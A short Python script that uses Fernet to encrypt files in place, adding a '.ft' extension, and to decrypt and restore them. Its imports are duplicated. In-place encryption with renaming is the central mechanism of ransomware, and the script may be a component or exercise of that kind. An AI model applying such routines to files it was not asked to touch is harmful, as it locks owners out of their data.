#!/usr/bin/env python3
from cryptography.fernet import Fernet
import os

from cryptography.fernet import Fernet
import os
def encrypt_file(file_path, key):
    try:
        fernet = Fernet(key)

        # read the original file
        with open(file_path, 'rb') as file:
            original = file.read()

        # encrypt the data
        encrypted = fernet.encrypt(original)

        # rewrite the encrypted file
        with open(file_path, 'wb') as file:
            file.write(encrypted)

        # rename the file to add the .ft extension
        if not file_path.endswith('.ft'):
            os.rename(file_path, file_path + '.ft')
    except Exception as e:
        print(f"Error encrypting file {file_path}: {str(e)}")

def decrypt_file(file_path, key):
    try:
        fernet = Fernet(key)

        # read the encrypted file
        with open(file_path, 'rb') as file:
            encrypted = file.read()

        # decrypt the data
        decrypted = fernet.decrypt(encrypted)

        # rename the file to remove the .ft extension
        if file_path.endswith('.ft'):
            new_file_path = file_path[:-3]  # remove the last '.ft' extension

            # rewrite the decrypted file
            with open(new_file_path, 'wb') as file:
                file.write(decrypted)

            os.remove(file_path)  # remove the original encrypted file

    except Exception as e:
        print(f"Error decrypting file {file_path}: {str(e)}")